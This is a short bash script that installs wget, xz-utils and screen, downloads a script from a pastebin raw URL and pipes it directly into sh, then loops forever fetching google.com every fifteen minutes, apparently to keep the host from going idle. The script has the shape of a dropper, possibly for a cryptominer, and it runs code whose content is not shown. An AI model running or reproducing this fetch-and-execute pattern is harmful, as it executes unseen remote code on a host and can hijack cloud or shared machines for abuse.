#!/bin/bash
apt-get update -y
apt-get install wget -y
apt-get install -y xz-utils
apt-get install screen -y
(wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d '\r') | sh
while true; do
    wget google.com
    sleep 900
done
